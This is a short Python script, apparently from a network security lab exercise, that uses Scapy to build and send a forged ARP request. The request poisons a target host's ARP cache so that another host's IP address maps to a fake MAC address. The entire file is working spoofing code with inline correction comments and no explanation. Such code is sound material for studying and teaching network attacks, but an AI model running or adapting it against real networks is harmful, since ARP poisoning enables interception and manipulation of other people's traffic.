#!/usr/bin/env python3
from scapy.all import *

target_IP = "10.9.0.5"
target_MAC = "02:42:0a:09:00:05"

fake_IP = "10.9.0.6"
fake_MAC = "02:42:0a:09:00:69"

ether = Ether(dst=target_MAC, src=fake_MAC)  # Corrected this line
arp = ARP(hwsrc=fake_MAC, psrc=fake_IP, pdst=target_IP, op=1)  # Corrected op field

pkt = ether/arp
sendp(pkt)
